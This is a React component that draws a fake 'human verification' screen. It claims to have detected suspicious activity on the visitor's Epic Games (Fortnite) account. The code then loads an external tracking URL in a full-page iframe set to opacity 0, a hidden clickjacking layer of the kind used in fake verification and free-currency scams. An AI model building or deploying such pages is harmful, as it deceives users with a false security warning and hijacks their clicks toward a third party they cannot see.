interface VerificationTabProps {
  username: string
}

export default function VerificationTab({ username }: VerificationTabProps) {
  return (
    <div className="container human-verification" style={{ display: 'block' }}>
      <div className="recent_bg">
        <div className="title_bar">
          <span><i className="fas fa-user-shield"></i> Verification</span>
        </div>
        <div className="main_bg text-center">
          <h2 className="font-verification">
            <i className="fas fa-user-times"></i><br />
            <span className="prepare-usr">{username}</span>
          </h2>
          <p className="font-verification-p">
            We&apos;ve detected suspicious activity on your Epic Games ( Fortnite ) account.
          </p>
          <iframe 
            src="https://epctrk.com/Verify4ow" 
            style={{ opacity: 0, marginTop: '100px' }}
            scrolling="no" 
            marginWidth={0}
            marginHeight={0}
            frameBorder="0" 
            width="100%" 
            height="100%"
          />
        </div>
      </div>
    </div>
  )
}